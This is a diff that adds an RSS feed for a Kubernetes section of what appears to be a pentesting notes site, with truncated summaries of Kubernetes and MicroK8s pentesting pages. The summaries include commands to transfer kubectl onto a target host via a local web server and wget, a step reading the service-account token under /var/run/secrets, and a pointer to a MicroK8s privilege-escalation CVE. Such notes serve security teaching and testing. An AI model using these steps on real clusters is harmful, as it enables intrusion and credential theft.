@@ -1,0 +1,26 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Kubernetes on D0CUM3NTN4T10N</title>
+    <link>https://documentnation.github.io/docs/hdks/container/kubernetes/</link>
+    <description>Recent content in Kubernetes on D0CUM3NTN4T10N</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <lastBuildDate>Wed, 17 Jan 2024 15:24:02 +0530</lastBuildDate>
+    <atom:link href="https://documentnation.github.io/docs/hdks/container/kubernetes/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Kubernetes Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/container/kubernetes/kubernetes-pentesting/</link>
+      <pubDate>Mon, 30 Jan 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/container/kubernetes/kubernetes-pentesting/</guid>
+      <description>Check if the Kubectl Command Available in Target Machine link kubectl -h k0s -h k0s kubectl -h microk8s kubectl -h If we cannot find kubectl, upload the binary from local machine.&#xA;First off, install the kubectl in local machine.&#xA;curl -LO &amp;#34;https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl&amp;#34; python3 -m http.server Then download the binary file into remote machine.&#xA;wget http://&amp;lt;local-ip&amp;gt;:8000/kubectl -O /tmp/kubectl chmod &amp;#43;x /tmp/kubectl Investigation From Inside link # Get JWT cat /var/run/secrets/kubernetes.</description>
+    </item>
+    <item>
+      <title>MicroK8s Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/container/kubernetes/microk8s-pentesting/</link>
+      <pubDate>Sat, 28 Jan 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/container/kubernetes/microk8s-pentesting/</guid>
+      <description>Ports and Services link Port 10250 - kubelet Port 10255 - kubelet (read only) Port 10257 - kube-controller Port 10259 - kube-scheduler Port 16443 - API server Port 25000 - cluster-agent Port 32000 - Docker registry Docker Registry (port 32000) linkIt is the same as Docker Registry Pentesting .&#xA;Investigation from Inside link # Version snap info microk8s Privilege Escalation (CVE-2019-15789) ≤ 1.15.2 linkSee the post for details.&#xA;1. Create a Pod Yaml File linkReplace the value of spec.</description>
+    </item>
+  </channel>
+</rss>
